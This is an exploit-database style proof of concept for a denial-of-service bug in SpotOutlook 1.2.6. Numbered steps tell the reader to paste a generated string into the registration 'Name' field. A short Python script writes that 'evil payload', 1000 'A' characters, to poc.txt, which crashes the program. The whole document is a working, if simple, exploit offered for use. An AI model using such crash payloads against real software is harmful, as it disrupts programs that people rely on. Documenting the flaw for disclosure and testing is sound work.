# Exploit Title: SpotOutlook 1.2.6 - 'Name' Denial of Service (PoC)
# Exploit Author: Ismail Tasdelen
# Exploit Date: 2020-01-06
# Vendor Homepage : http://www.nsauditor.com/
# Link Software : http://www.nsauditor.com/downloads/spotoutlook_setup.exe
# Tested on OS: Windows 10
# CVE : N/A

'''
Proof of Concept (PoC):
=======================

1.Download and install SpotOutlook
2.Run the python operating script that will create a file (poc.txt)
3.Run the software "Register -> Enter Registration Code
4.Copy and paste the characters in the file (poc.txt)
5.Paste the characters in the field 'Name' and click on 'Ok'
6.SpotOutlook Crashed
'''

#!/usr/bin/python
    
buffer = "A" * 1000
 
payload = buffer
try:
    f=open("poc.txt","w")
    print("[+] Creating %s bytes evil payload." %len(payload))
    f.write(payload)
    f.close()
    print("[+] File created!")
except:
    print("File cannot be created.")